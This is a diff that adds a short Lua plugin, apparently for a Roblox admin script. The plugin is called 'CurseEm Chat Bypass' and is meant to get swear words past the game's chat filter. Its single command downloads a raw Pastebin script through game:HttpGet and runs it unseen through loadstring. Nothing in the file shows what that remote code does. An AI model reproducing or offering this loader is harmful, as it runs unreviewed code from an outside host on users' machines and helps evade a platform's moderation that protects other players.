@@ -1,0 +1,15 @@
+local Plugin = {
+	["PluginName"] = "CurseEm Chat Bypass",
+	["PluginDescription"] = "CurseEm chat bypass. Do /e your swear",
+	["Commands"] = {
+		["Curse"] = {
+			["Description"] = "Curse",
+			["Aliases"] = {'cursebypass', 'cursem', 'chatbypass'},
+			["Function"] = function(args,speaker)
+				 loadstring(game:HttpGet("https://pastebin.com/raw/yQDXewGn"))()
+			end,
+		},
+	},
+}
+
+return Plugin
